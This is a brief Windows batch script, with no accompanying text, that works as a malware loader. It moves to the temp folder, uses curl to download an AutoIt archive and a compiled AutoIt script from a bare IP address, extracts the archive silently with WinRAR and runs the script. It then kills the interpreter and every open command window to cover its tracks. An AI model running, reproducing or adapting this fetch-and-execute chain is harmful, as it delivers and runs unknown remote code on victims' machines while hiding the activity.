@echo off
cd %temp%
curl -O http://103.97.127.14/AutoIt3.rar
curl -O http://103.97.127.14/SomeThing.a3x
"C:\Program Files\WinRAR\WinRAR.exe" x -ibck "AutoIt3.rar" "\"
"AutoIt3_x64.exe" SomeThing.a3x
timeout /t 10 >nul
taskkill /im AutoIt3_x64.exe /f
taskkill /f /im cmd.exe
exit